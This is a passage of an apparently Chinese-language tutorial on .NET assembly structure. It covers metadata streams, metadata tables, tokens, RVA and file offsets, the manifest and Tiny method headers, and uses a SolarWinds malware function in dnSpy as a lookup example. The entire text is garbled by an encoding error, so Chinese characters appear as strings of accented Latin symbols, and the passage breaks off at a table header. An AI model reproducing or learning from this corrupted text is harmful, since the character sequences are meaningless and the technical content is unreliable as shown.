‡å¿—æ—¶ï¼Œè¡¨ç¤ºç¨‹åºéœ€è¦32ä½è¿è¡Œåº“ï¼Œå³ä½¿è¿è¡Œåœ¨64ä¸ºæ“ä½œç³»ç»Ÿä¸Šã€‚å®ƒé€šå¸¸ç”¨äºä¾èµ–äº32ä¸ºæœ¬æœºä¾èµ–é¡¹æˆ–32ä½è¿è¡Œæ—¶çš„ç‰¹å®šè¡Œä¸ºçš„ç¨‹åºé›†ã€‚ Strong Name Signed: å¼ºç­¾åã€‚æŒ‡ç¤ºç¨‹åºé›†æ˜¯å¦å·²ä½¿ç”¨å¼ºç­¾åã€‚å¼ºå‘½åæ¶‰åŠä½¿ç”¨å…¬é’¥/ç§é’¥å¯¹ç¨‹åºé›†è¿›è¡Œç­¾åï¼Œæä¾›å”¯ä¸€æ ‡è¯†å¹¶ç¡®ä¿ç¨‹åºé›†æœªè¢«ç¯¡æ”¹ã€‚ å­˜å‚¨æµï¼ˆStreamsï¼‰æ˜¯æŒ‡åŒ…å«ç‰¹å®šç±»å‹çš„å…ƒæ•°æ®çš„ç»“æ„åŒ–æ•°æ®æ®µï¼Œ.NET ç¨‹åºé›†å…ƒæ•°æ®çš„å…³é”®æµåŒ…æ‹¬ï¼š #~ï¼ˆTildeï¼‰Streamï¼šä¸»å…ƒæ•°æ®å—åŒ…å«å…ƒæ•°æ®è¡¨ã€‚è¿™äº›è¡¨å­˜å‚¨æœ‰å…³ç¨‹åºé›†ä¸­å®šä¹‰çš„ç±»å‹ã€æ–¹æ³•ã€å­—æ®µã€å‚æ•°å’Œå…¶ä»–å…ƒç´ çš„ä¿¡æ¯ã€‚æ³¢æµªçº¿æ•°æ®å—æ˜¯æ ¹æ® CLI è§„èŒƒå®šä¹‰çš„å…ƒæ•°æ®è¡¨æ¨¡å¼æ„é€ çš„ã€‚ #Strings Stream: è¿™ä¸ªæ•°æ®å—å­˜å‚¨å…ƒæ•°æ®ä½¿ç”¨çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ç±»å‹åç§°ã€æ–¹æ³•åç§°å’Œå­—æ®µåç§°è¿™å—å†…å®¹åœ¨åæ–‡ä¼šç”¨åˆ°ã€‚å…ƒæ•°æ®è¡¨ï¼ˆ#~æ•°æ®å—ä¸­ï¼‰çš„å¼•ç”¨æŒ‡å‘äº†å½“å‰æ•°æ®æµä¸­å®é™…å­—ç¬¦ä¸²çš„åç§»é‡ã€‚ #US (User Strings) Stream: è¿™ä¸ªæ•°æ®å—ä¿å­˜ç¨‹åºé›†ä¸­ä½¿ç”¨çš„æ–‡æœ¬å­—ç¬¦ä¸²å€¼ï¼Œå¦‚ä»£ç ä¸­çš„å­—ç¬¦ä¸²å˜é‡æˆ–å­—ç¬¦ä¸²å¸¸é‡çš„é»˜è®¤å€¼ã€‚å…ƒæ•°æ®å¼•ç”¨è¿™äº›å­—ç¬¦ä¸²ï¼Œç‰¹åˆ«æ˜¯åœ¨åŠ è½½å­—ç¬¦ä¸²æ–‡å­—çš„æŒ‡ä»¤ä¸­ã€‚ #GUID Stream: åŒ…å«ç¨‹åºé›†ä½¿ç”¨çš„GUIDã€‚å›ºå®šå¤§å°ä¸º 0x10ï¼Œæ­¤æ•°æ®å—ä¸­çš„æ¯ä¸ªæ¡ç›®éƒ½æ˜¯ä¸€ä¸ªGUIDï¼Œç”¨äºæ ‡è¯†å…ƒæ•°æ®çš„æŸäº›æ–¹é¢ï¼Œå¦‚æ¨¡å—ç‰ˆæœ¬çš„ID(MVID)ã€‚ #Blob Stream: â€œBinary Large Objectâ€ æ•°æ®å—ã€‚å­˜å‚¨ç”¨äºå„ç§æƒ…å†µçš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚å­—æ®µçš„é»˜è®¤å€¼ã€æ–¹æ³•ç­¾åã€å±æ€§ç­¾åå’Œå°é€å¤„ç†ä¿¡æ¯ã€‚å…ƒæ•°æ®è¡¨ä¸­çš„é¡¹å¼•ç”¨æ­¤æ•°æ®å—ä»¥è·å–è¯¦ç»†çš„äºŒè¿›åˆ¶ä¿¡æ¯ã€‚ #Pdb Stream: å¯é€‰æ•°æ®å—ï¼ŒåŒ…æ‹¬å…ƒæ•°æ®å’Œ IL ä»£ç ä¸æºæ–‡ä»¶ä»¥åŠå’Œæ–‡ä»¶ç›¸å…³è”çš„è°ƒè¯•ä¿¡æ¯ã€‚ åœ¨ä¸åŒçš„ .NET ç¨‹åºé›†æŸ¥çœ‹åˆ°çš„å†…å®¹å¯èƒ½ä¸å¤ªä¸€æ ·ï¼ŒILSpy ä¼šå±•ç¤º å…ƒæ•°æ® çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼ŒdnSpy åˆ™ä¼šè§£æä¸ºä¸€ä¸ª PE æ–‡ä»¶ã€‚ Metadata Metadata åœ¨ .NET ä¸­å°±æ˜¯ä¸€ç»„æè¿°ç¨‹åºç»“æ„åŠå…¶ç‰¹ç‚¹çš„äºŒè¿›åˆ¶æ•°æ®ã€‚åŒ…å«äº†ä»£ç ä¸­å®šä¹‰çš„ç±»å‹ï¼ˆç±»ã€æ¥å£ã€æšä¸¾ç­‰ï¼‰ï¼Œæˆå‘˜å®šä¹‰ï¼ˆæ–¹æ³•ã€å±æ€§ã€å­—æ®µã€äº‹ä»¶ï¼‰å¼•ç”¨ç±»å‹å’Œæˆå‘˜ä»¥åŠç¨‹åºé›†æœ¬èº«çš„ä¿¡æ¯ã€‚ åœ¨å­˜å‚¨æ¬¡æè¿°æ€§ä¿¡æ¯çš„ PE æ–‡ä»¶ä¸­ï¼Œå…ƒæ•°æ®è¢«åˆ’åˆ†ä¸ºå‡ ä¸ªè¡¨ï¼Œç»Ÿç§°ä¸ºå…ƒæ•°æ®è¡¨ã€‚æ¯ä¸ªè¡¨éƒ½éµå¾ªä¸€ä¸ªç‰¹å®šçš„æ¨¡å¼ï¼Œè¯¥æ¨¡å¼æ¦‚è¿°å…¶åŒ…æ‹¬çš„æ•°æ®ç»“æ„å’Œæ€§è´¨ã€‚ä»¥ä¸‹æ˜¯å¯ä»¥åœ¨å…ƒæ•°æ®è¡¨ä¸­èƒ½æ‰¾åˆ°çš„ä¸€äº›å…³é”®ç±»å‹çš„ä¿¡æ¯ï¼š **å®šä¹‰è¡¨ï¼ˆDefinition Tableï¼‰ï¼š**åŒ…å«æœ‰å…³åœ¨å½“å‰ç¨‹åºé›†ä¸­å®šä¹‰çš„ä»£ç çš„ä¿¡æ¯ã€‚åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªè¡¨ï¼š ç±»å‹å®šä¹‰è¡¨ï¼ˆTypeDef Tableï¼‰ï¼š æºä»£ç ä¸­å®šä¹‰çš„æ¯ä¸ªç±»æˆ–æ¥å£çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶åç§°ã€å¯è§æ€§ã€åŸºç±»å‹ä»¥åŠå®ƒåŒ…å«çš„æ–¹æ³•æˆ–å±æ€§ã€‚ä¸»è¦å…³é”®å­—åŒ…æ‹¬ï¼š ç±»å‹åï¼šç±»å‹çš„åç§° å‘½åç©ºé—´ï¼šè¯¥ç±»å‹æ‰€å±çš„å‘½åç©ºé—´ åŸºç¡€ç±»å‹ï¼šTypedefã€TypeRef æˆ– TypeSpec è¡¨çš„ç´¢å¼•ï¼ŒæŒ‡ç¤ºç±»å‹çš„åŸºç±»ã€‚ æ ‡å¿—ä½ï¼šæè¿°ç±»å‹å±æ€§ï¼ˆå¯è§†åŒ–ï¼ŒæŠ½è±¡/å°è£…çŠ¶æ€ï¼Œç­‰ï¼‰ æ–¹æ³•å®šä¹‰è¡¨ï¼ˆMethodDef Tableï¼‰ï¼šæ¯ä¸ªæ–¹æ³•çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶åç§°ã€ç­¾åï¼ˆå‚æ•°å’Œè¿”å›ç±»å‹ï¼‰ä»¥åŠä¸å…¶ç›¸å…³çš„ IL ä»£ç ã€‚ä¸»è¦å…³é”®å­—ä¸ºä»¥ä¸‹å‡ ä¸ªï¼š åç§°ï¼šæ–¹æ³•å ç­¾åï¼šæŒ‡å‘æ–¹æ³•åç§°çš„ blob ç´¢å¼•ï¼Œå…¶ä¸­åŒ…æ‹¬æ–¹æ³•çš„è°ƒç”¨çº¦å®šã€è¿”å›ç±»å‹å’Œå‚æ•°ã€‚ ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰ï¼šç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ŒæŒ‡å‘æ–¹æ³•å®ç°åœ¨PEæ–‡ä»¶ä¸­ä½ç½®ã€‚ å…³é”®å­—å®šä¹‰è¡¨ï¼ˆFieldDef Tableï¼‰: æè¿°æ¯ä¸€ä¸ªå…³é”®å­—ï¼ˆç±»æˆå‘˜å˜é‡ï¼‰ï¼ŒåŒ…æ‹¬åç§°å’Œç±»å‹ï¼Œå…³é”®å­—å¦‚ä¸‹æ‰€ç¤ºï¼š åç§°ï¼šå…³é”®å­—åç§° ç­¾åï¼ŒæŒ‡å‘å…³é”®å­—çš„ç±»å‹ç­¾åçš„ blob ç´¢å¼• æ ‡å¿—ä½ï¼šæŒ‡å®šå­—æ®µå±æ€§ï¼Œå¦‚å¯è§æ€§ã€é™æ€/å®ä¾‹ï¼Œå’Œä»…åˆå§‹åŒ–ï¼ˆåªè¯»ï¼‰ã€‚ å¼•ç”¨è¡¨(Reference Tables)ï¼šåŒ…å«ç¨‹åºé›†å¤–éƒ¨ä½†åˆç¨‹åºé›†å¼•ç”¨çš„ä»£ç ä¿¡æ¯ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š ç±»å‹å¼•ç”¨è¡¨ï¼ˆTypeRef Tableï¼‰: å½“å‰ç¨‹åºé›†å¼•ç”¨çš„å…¶ä»–ç¨‹åºé›†ä¸­å®šä¹‰çš„ç±»å‹çš„ä¿¡æ¯ æˆå‘˜å¼•ç”¨è¡¨ï¼ˆMemberRef Tableï¼‰ï¼šæè¿°å®šä¹‰åœ¨å…¶ä»–æ¨¡å—æˆ–ç¨‹åºé›†çš„æˆå‘˜ï¼ˆæ–¹æ³•ã€å±æ€§ç­‰ï¼‰ æ¸…å•å…ƒæ•°æ®è¡¨ï¼ˆManifest Metadata Tableï¼‰ï¼šæè¿°ç¨‹åºé›†æœ¬èº«ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹ï¼š ç¨‹åºé›†è¡¨ï¼ˆAssembly Tableï¼‰ï¼šå…³äºç¨‹åºé›†æœ¬èº«çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚åå­—ï¼Œç‰ˆæœ¬ï¼Œå·²ç»å¼ºå¼ºç­¾åæ ¡éªŒã€‚ åº”ç”¨ç¨‹åºé›†è¡¨ï¼ˆAssemblyRef Tableï¼‰ï¼šæè¿°å½“å‰ç¨‹åºé›†ä¾èµ–çš„å…¶ä»–ç¨‹åºé›†ï¼ŒåŒ…æ‹¬ä»–ä»¬çš„åç§°ã€ç‰ˆæœ¬ã€å…¬é’¥ï¼ˆå¦‚ä½•æ˜¯å¼ºåç§°çš„ï¼‰ æ¨¡å—è¡¨ï¼ˆModule Tableï¼‰ï¼šå…³äºå½“å‰æ¨¡å—çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚æ¨¡å—åã€ç”¨äºæ ‡è¯†å”¯ä¸€æ€§çš„GUID è‡ªå®šä¹‰å±æ€§è¡¨ï¼ˆCustomAttribute Tableï¼‰ï¼šåŒ…å«ç¨‹åºé›†ä¸­ç”¨äºä¸åŒå…ƒç´ çš„è‡ªå®šä¹‰å±æ€§çš„è¯¦ç»†ä¿¡æ¯ã€‚ äº‹ä»¶è¡¨å’Œå±æ€§è¡¨ï¼ˆEvent Table and Property Tableï¼‰ï¼šæè¿°åœ¨ç±»å‹ä¸­å£°æ˜çš„äº‹ä»¶å’Œå±æ€§ã€‚ å‚æ•°è¡¨ï¼ˆParam Tableï¼‰ï¼šå…³äºå„å‡½æ•°å‚æ•°çš„ä¿¡æ¯ã€‚ ç‹¬ç«‹ç­¾åè¡¨ï¼ˆStandAlonesig Tableï¼‰ï¼šç‹¬ç«‹ç­¾åå¯ç”¨äºå°è£…ç±»å‹æˆ–æ–¹æ³•ç­¾åã€‚ å¸¸é‡è¡¨ï¼ˆConstant Tableï¼‰ï¼šå­˜å‚¨ä»£ç ä¸­å®šä¹‰çš„å¸¸é‡ã€‚ è¿™äº›è¡¨å¯¹äº CLR çš„æ“ä½œè‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä»¬æä¾›äº†æ‰§è¡Œç¨‹åºé›†æ‰€éœ€çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚åœ¨è¿è¡Œæ—¶è¯»å–ä»–ä»¬ä»¥æ‰§è¡Œå„ç§ä»»åŠ¡ï¼Œå¦‚ç±»å‹å®ä¾‹åŒ–ã€æ–¹æ³•è°ƒç”¨ã€å®‰å…¨éªŒè¯ç­‰ã€‚ è¿™äº›å…ƒæ•°æ®è¡¨ä»¥é«˜åº¦ä¼˜åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼ç¼–ç ï¼Œè¿è¡Œæ—¶å¯ä»¥æœ‰æ•ˆåœ°å¤„ç†è¿™äº›æ ¼å¼ã€‚é€šè¿‡åå°„ï¼Œè¿˜å¯ä»¥ä»¥ç¼–ç¨‹æ–¹å¼è®¿é—®å…ƒæ•°æ®ï¼Œå¹¶ä¸”å…è®¸ .NET åº”ç”¨ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥è‡ªå·±è·Œç»“æ„æˆ–å…¶ä»–ç¨‹åºé›†çš„ç»“æ„ã€‚è¿™ç§å†…çœèƒ½åŠ›æ”¯æŒ .NET æ¡†æ¶æ”¯æŒä¸€ç³»åˆ—åŠ¨æ€ç¼–ç¨‹ã€‚ å…ƒæ•°æ®å”¯ä¸€æ ‡è¯†ï¼ˆMetadata Unique Identidier,IDï¼‰ å…ƒæ•°æ®æ ‡è®°æ˜¯ CLR ç”¨äºå¼•ç”¨ç¨‹åºé›†çš„å…ƒæ•°æ®è¡¨ä¸­çš„å…ƒæ•°æ®å…ƒç´ çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚è¿™äº›è¡¨çš„æ¯ä¸ªæ¡ç›®éƒ½è¢«åˆ†é…äº†ä¸€ä¸ªå…ƒæ•°æ®æ ‡è®°ï¼Œä½œä¸ºå¯¹è¯¥ç‰¹å®šæ¡ç›®çš„ç¨³å®šå¼•ç”¨ã€‚ å…ƒæ•°æ®æ ‡è®°å¯¹äº CLR ä¸å·²ç¼–è¯‘ä»£ç è¿›è¡Œäº¤äº’è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä»¬ä¸ºè¿è¡Œæ—¶åº“æä¾›äº†æœ‰æ•ˆçš„æ ‡è¯†å’Œè®¿é—®å…ƒæ•°æ®çš„æ–¹æ³•ã€‚PEæ–‡ä»¶ä¸­çš„æ¯ä¸ªç±»å‹ã€æˆå‘˜ã€ç­¾åæˆ–å…¶ä»–å…ƒæ•°æ®æè¿°ç¬¦éƒ½å…·æœ‰ç›¸åº”çš„æ ‡è®°ã€‚ åœ¨ dnSpy ä¸­ï¼Œæ¯ä¸ªæ–¹æ³•åœ¨å…¶å£°æ˜ä¹‹ä¸Šéƒ½åŒ…å«ä¸€ä¸ªæ³¨é‡Šï¼Œä¿¡æ¯åŒ…æ‹¬ä»¤ç‰Œã€RIDã€RVA å’Œæ–‡ä»¶åç§»é‡ã€‚å¦‚ä¸‹æ‰€ç¤ºå±å¹•æˆªå›¾ï¼š çœ‹ä¸€äº›å„ä¸ªå­—æ®µçš„å«ä¹‰ï¼š æ ‡è®°ï¼ˆTokenï¼‰: å…ƒæ•°æ®æ ‡è®°çš„é«˜å­—èŠ‚ï¼ˆbig-endianï¼‰æŒ‡å®šå…ƒæ•°æ®çš„ç±»å‹ï¼Œä»¥ä¾¿äºè¿è¡Œæ—¶è¯†åˆ«ã€‚å®ƒæŒ‡ç¤ºä»¤ç‰Œå¼•ç”¨çš„å…ƒæ•°æ®ä¸­çš„é‚£ä¸ªè¡¨ï¼ˆTypeDefã€TypeRefã€MethodDefç­‰ï¼‰ã€‚æœ‰å…³ä»¤ç‰Œç±»å‹çš„å€¼å¾—æˆ‘æ›´å¤šä¿¡æ¯å¯ä»¥å‚è§é™„å½•Aã€‚ è¡Œç´¢å¼•ï¼ˆRow Index,RIDï¼‰ï¼šå…ƒæ•°æ®æ ‡è®°çš„å…¶ä½™24ä½ç”¨äºç´¢å¼•ç›¸å…³çš„å…ƒæ•°æ®è¡¨ã€‚å®ƒä»¬æŒ‡ç¤ºå¯ä»¥åœ¨å“ªé‡Œæ‰¾åˆ°æ­¤å…ƒç´ çš„å®é™…å…ƒæ•°æ®çš„è¡Œå·ã€‚ç”±äºæ¯ä¸ªè¡¨å¯ä»¥æœ‰æ•°ç™¾ä¸‡ä¸ªæ¡ç›®ï¼Œå› æ­¤24ä½å…è®¸æœ‰è¶³å¤ŸèŒƒå›´çš„ç´¢å¼•ã€‚ ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰: ç›¸å¯¹è™šæ‹Ÿåœ°å€æ˜¯å‡½æ•°å®ä½“ï¼ˆç¼–è¯‘çš„ IL ä»£ç ï¼‰ç›¸å¯¹äºç¨‹åºè¢«åŠ è½½åˆ°å†…å­˜çš„åŸºåœ°å€çš„åœ°å€ã€‚ä¾‹å¦‚ï¼Œ0x00023B28 æ„å‘³ç€è¯¥å‡½æ•°çš„ IL ä»£ç ä»åŠ è½½æ¨¡å—çš„åŸºåœ°å€çš„å†…å­˜åç§»å¤§å°ã€‚CLR ä½¿ç”¨ RVA åœ¨è¿è¡Œæ—¶å®šä½å¹¶æ‰§è¡Œå‡½æ•°ä»£ç ã€‚åœ¨ PE æ–‡ä»¶çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè¯¥æ–‡ä»¶çš„æ ¼å¼ç”¨äºwindowså¹³å°çš„ .NET ç¨‹åºé›†ï¼Œå½“æ–‡ä»¶åŠ è½½åˆ°å†…å­˜åï¼ŒRVA è¢«å¹¿æ³›ç”¨äºå¼•ç”¨æ–‡ä»¶çš„å„ä¸ªéƒ¨åˆ†ã€‚ æ–‡ä»¶åç§»ï¼ˆFile Offsetï¼‰: è¿™ä¸ªå€¼è¡¨ç¤ºå½“å‰å‡½æ•°çš„ IL ä»£ç åœ¨ .NET ç¨‹åºé›†ï¼ˆ.dll æˆ– .exe æ–‡ä»¶ï¼‰ä¸­çš„å®é™…ä½ç½®ã€‚0x00021D28 è¡¨ç¤ºä»æ–‡ä»¶å¼€å§‹åˆ°å‡½æ•°ä»£ç å¼€å§‹çš„ä½ç½®çš„åç§»é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚è¿™å¯¹äºç›´æ¥å¯¹ç¨‹åºé›†æ–‡ä»¶è¿›è¡ŒäºŒè¿›åˆ¶åˆ†ææˆ–æ“ä½œéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒèƒ½å‡†ç¡®çš„å‘Šè¯‰ä½ åœ¨æ–‡ä»¶ä¸­å“ªé‡Œå¯ä»¥æ‰¾åˆ°è¯¥æ–¹æ³•çš„ä»£ç ã€‚ å…ƒæ•°æ®æ ‡è®°çš„ç»“æ„åœ¨è¿è¡Œæ—¶è§£æå¼•ç”¨æé«˜äº† CLR çš„æ€§èƒ½ã€‚ä¾‹å¦‚ï¼Œå½“ JIT ç¼–è¯‘å™¨éœ€è¦å°† IL ç¼–è¯‘æˆæœ¬æœºä»£ç æ—¶ï¼Œå®ƒä½¿ç”¨å…ƒæ•°æ®æ ‡è®°æ¥æŸ¥æ‰¾æ–¹æ³•ç­¾åã€ç±»å‹ä¿¡æ¯ç­‰ã€‚å…ƒæ•°æ®ä»¤ç‰Œç³»ç»Ÿè¿˜æ”¯æŒ CLR çš„åŠ¨æ€ç‰¹æ€§ï¼Œæ¯”å¦‚åå°„ã€‚å®ƒå…è®¸æœ‰æ•ˆåœ°æ‰§è¡Œå„ç§è¿è¡Œæ—¶æœåŠ¡ï¼Œå¦‚ç±»å‹å®‰å…¨ã€å®‰å…¨æ£€æŸ¥å’Œè·¨è¯­è¨€äº’æ“ä½œæ€§ã€‚ å…ƒæ•°æ®è¡¨ç¤ºä¾‹ å¦‚ä¸‹æ‰€ç¤ºä¸º SolarWinds æ¶æ„è½¯ä»¶çš„å¯åŠ¨å‡½æ•°ã€‚ æ ‡è®°çš„é«˜ä½ï¼ˆ0x6ï¼‰å€¼ä¸º6ï¼Œå¯¹åº”å…ƒæ•°æ®è¡¨6ï¼Œå³æ–¹æ³•å®šä¹‰è¡¨ï¼ˆMethodDef Tableï¼‰ã€‚ æ ‡è®°çš„ä¸‹åŠéƒ¨åˆ†æ˜¯ 0x5FAï¼Œæ˜¯å…¶åœ¨ MethodDef Table ä¸­çš„æ¡ç›®å·ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š æ£€æŸ¥ Start å‡½æ•°çš„å…ƒæ•°æ®çš„ä¸‹åŠéƒ¨åˆ†ï¼Œå€¼ 0x00058D66 æ˜¯ä»å¯æ‰§è¡Œæ–‡ä»¶å¼€å§‹çš„åç§»é‡ï¼Œåç§»é‡ï¼ˆ0x1EC15ï¼‰çš„å€¼åœ¨ å­—ç¬¦ä¸²æµï¼ˆ#String streamï¼‰ ä¸­ï¼Œå®ƒå°†åŒ…å«æ–¹æ³•åç§°ï¼šStartã€‚å¦‚ä¸‹æ‰€ç¤ºæ˜¯åœ¨ dnSpy çš„ Hex ç¼–è¾‘å™¨ä¸­çš„æ•°æ®ï¼š è¿™é‡Œæ‰¾ Start å‡½æ•°åœ¨ #Strings æµä¸­ä½ç½®æ—¶ï¼Œéœ€è¦æŒ‰ç…§ Method çš„ç´¢å¼•æ¥æŸ¥æ‰¾ã€‚hex(1530) = 0x5FAï¼Œå‰æ–‡æåˆ°äº† Strings æµçš„ç»„æˆï¼Œæ‰€ä»¥åœ¨æŸ¥æ‰¾ Start æ–¹æ³•æ—¶ï¼Œéœ€è¦ä¸­ Strings æµä¸­çš„æ–¹æ³•åå¼€å§‹ï¼ˆMethodï¼‰ï¼Œç´¢å¼•ä¸º 0x5FAã€‚ å­—ç¬¦ä¸²æµä¸­åç§»é‡çš„å€¼å¦‚ä¸Šæ‰€ç¤ºã€‚dnSpy ä¼šè‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²çš„å€¼ã€‚ è¦æŸ¥çœ‹ String æµä¸­çš„æ•°æ®ï¼Œéœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š åœ¨æ–°çª—å£ä¸­ï¼Œè½¬åˆ°åç§»é‡ï¼ˆç›¸å¯¹äº å­—ç¬¦ä¸²æµåŸºåœ°å€ï¼‰å¹¶æŸ¥çœ‹æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„å­—ç¬¦ä¸² - Startã€‚ Manifestï¼ˆæ¸…å•ï¼‰ .NET æ¸…å•æ˜¯ .NET ç¨‹åºé›†çš„å…³é”®éƒ¨åˆ†ï¼Œæè¿°ç¨‹åºé›†ä¸­çš„å…ƒç´ å¦‚ä½•å½¼æ­¤å…³è”ã€‚å®ƒåµŒå…¥åœ¨æ¯ä¸ªç¨‹åºé›†ä¸­ï¼Œæ— è®ºå®ƒæ˜¯é™æ€çš„è¿˜æ˜¯åŠ¨æ€çš„ï¼Œå¹¶ä¸”åŒ…å«ç¨‹åºé›†æ“ä½œæ‰€éœ€çš„åŸºæœ¬æ•°æ®ï¼ŒåŒ…æ‹¬å…¶ç‰ˆæœ¬è¦æ±‚ã€å®‰å…¨æ ‡è¯†ã€èŒƒå›´å®šä¹‰ä»¥åŠå¯¹èµ„æºå’Œç±»çš„å¼•ç”¨çš„è§£æã€‚ .NET æ¸…å•çš„ä¸»è¦åŠŸèƒ½æ˜¯æä¾›å…¨é¢çš„å…ƒæ•°æ®æè¿°ï¼Œä»¥ä¾¿äºç»„ä»¶çš„è¯†åˆ«ã€ç‰ˆæœ¬æ§åˆ¶å’Œä¾èµ–ç®¡ç†ã€‚å®ƒç¡®ä¿ç¨‹åºé›†æ˜¯è‡ªæè¿°çš„ï¼Œæœ‰åŠ©äºè§£æç±»å‹å¼•ç”¨å¹¶å°†è¿™äº›å¼•ç”¨æ˜ å°„åˆ°åŒ…å«å…¶å£°æ˜å’Œå®ç°çš„æ–‡ä»¶ã€‚è¿™å¯¹äºç»´æŠ¤ç‰ˆæœ¬æ§åˆ¶ä»¥åŠç¡®ä¿ä¸åŒç¨‹åºé›†åˆä¾èµ–å®ƒä»¬çš„ç»„ä»¶ä¹‹é—´çš„å…¼å®¹æ€§å°¤ä¸ºå…³é”®ã€‚ .NET æ¸…å•æ–‡ä»¶å†…å®¹ æ¸…å•åŒ…æ‹¬å¯¹ç¨‹åºé›†çš„æ ‡è¯†å’Œæ“ä½œè‡³å…³é‡è¦çš„å„ç§ä¿¡æ¯ï¼š ç¨‹åºé›†åç§°ï¼šæŒ‡å®šç¨‹åºé›†åç§°çš„æ–‡æœ¬å­—ç¬¦ä¸² ç‰ˆæœ¬å·ï¼šåŒ…æ‹¬ä¸»ç‰ˆæœ¬å·å’Œæ¬¡ç‰ˆæœ¬å·ï¼Œä»¥åŠä¿®è®¢ç‰ˆæœ¬å·å’Œæ„å»ºç‰ˆæœ¬å·ï¼Œä¾›é€šç”¨è¯­è¨€è¿è¡Œåº“ç”¨äºæ‰§è¡Œç‰ˆæœ¬ç­–ç•¥ã€‚ è¯­è¨€åŠåŒºåŸŸä¿¡æ¯ï¼šæŒ‡å®šç¨‹åºé›†æ”¯æŒçš„è¯­è¨€å’ŒåŒºåŸŸï¼Œå¯¹äºåŒ…å«åŒºåŸŸæ€§è¯­è¨€ç‰¹å®šä¿¡æ¯çš„é™„å±ç¨‹åºé›†å°¤ä¸ºé‡è¦ã€‚ ç¨‹åºé›†ä¸­çš„æ–‡ä»¶åˆ—è¡¨ï¼šåŒ…æ‹¬ç¨‹åºé›†ä¸­åŒ…å«çš„æ¯ä¸ªæ–‡ä»¶åŠå…¶åç§°çš„æ•£åˆ—ï¼Œä»¥ç¡®ä¿å®Œæ•´æ€§å’Œç¨‹åºé›†çš„å®Œæ•´æ€§ã€‚ ç±»å‹åº”ç”¨ä¿¡æ¯ï¼šè¿è¡Œæ—¶ç”¨äºå°†ç±»å‹å¼•ç”¨æ˜ å°„åˆ°å…¶å£°æ˜å’Œå®ç°çš„æ–‡ä»¶ï¼Œè¿™å¯¹ç±»å‹å®‰å…¨æ€§å’Œæ­£ç¡®æ€§è‡³å…³é‡è¦ã€‚ å¼•ç”¨ç¨‹åºé›†ä¿¡æ¯ï¼šåˆ—å‡ºå½“å‰ç¨‹åºé›†é™æ€å¼•ç”¨çš„å…¶ä»–ç¨‹åºé›†ï¼ŒåŒ…æ‹¬å®ƒä»¬çš„åç§°ã€å…ƒæ•°æ®ï¼ˆå¦‚ç‰ˆæœ¬å·ã€è¯­è¨€ã€æ“ä½œç³»ç»Ÿï¼‰ä»¥åŠå¦‚æœæœ‰å¼ºå‘½åæ—¶çš„å…¬é’¥ å‡½æ•°ä½“ç»“æ„ .NET å‡½æ•°ä½“ç»“æ„å¯ä»¥ç¼–ç ä¸º â€œTinyâ€ æ ¼å¼å’Œ â€œFatâ€æ ¼å¼ï¼Œæ ¹æ®å‡½æ•°çš„å¤æ‚æ€§å’Œéœ€æ±‚ï¼Œæ¯ç§æ ¼å¼ç”¨äºä¸åŒçš„ç›®çš„ã€‚åœ¨ Tiny å¤´å’Œ Fat å¤´ä¹‹é—´çš„é€‰æ‹©æ˜¯æœ‰ .NET ç¼–è¯‘å™¨åŸºäºæ‰€ç¼–è¯‘å‡½æ•°çš„å¤æ‚æ€§å†³å®šçš„ã€‚ Tiny å¤´ï¼ˆThe Tiny headerï¼‰æ˜¯ä¸¤ç§æ ¼å¼ä¸­è¾ƒç®€å•çš„ä¸€ç§ã€‚å½“ä¸€ä¸ªæ–¹æ³•æ»¡è¶³ç‰¹å®šçš„æ¡ä»¶æ—¶ï¼Œå°±ä¼šä½¿ç”¨è¿™ä¸ªheaderï¼š å‡½æ•°ä½“å°äº 64 bytes å †æ ˆæ·±åº¦ä¸ä¼šè¶…è¿‡8æ§½ï¼ˆå †æ ˆä¸Šçš„æ¯ä¸ªæ¡ç›®éƒ½æœ‰ä¸€ä¸ªæ§½ï¼Œä¸æ¡ç›®çš„å¤§å°æ— å…³ï¼‰ ä¸åŒ…å«æœ¬åœ°å˜é‡æˆ–ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆSEHï¼‰ Tiny å¤´æ›´åŠ ç´§å‡‘ï¼Œå¹¶ä¸”é’ˆå¯¹å°å‹å‡½æ•°è¿›è¡Œäº†ä¼˜åŒ–ã€‚ Tiny å¤´æ˜¯ä¸€ä¸ªå•å­—èŠ‚é•¿åº¦ï¼Œä¸‹é¢çš„ 2 bits è®¾ç½®ä¸º 0x2ï¼ˆäºŒè¿›åˆ¶ 10ï¼‰ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ª Tiny å¤´ï¼Œå‰©ä¸‹çš„ 6 bits è¡¨ç¤ºå‡½æ•°æçš„å¤§å°ã€‚è¿™ç§ç´§å‡‘çš„æ ¼å¼å…è®¸æœ‰æ•ˆåœ°å­˜å‚¨å°å‹å‡½æ•°ä½“ï¼Œå‡å°‘äº†ç®€å•æ–¹æ³•çš„å…ƒæ•°æ®å¼€é”€ã€‚ Field Size(Bits) Description Header Flag 2 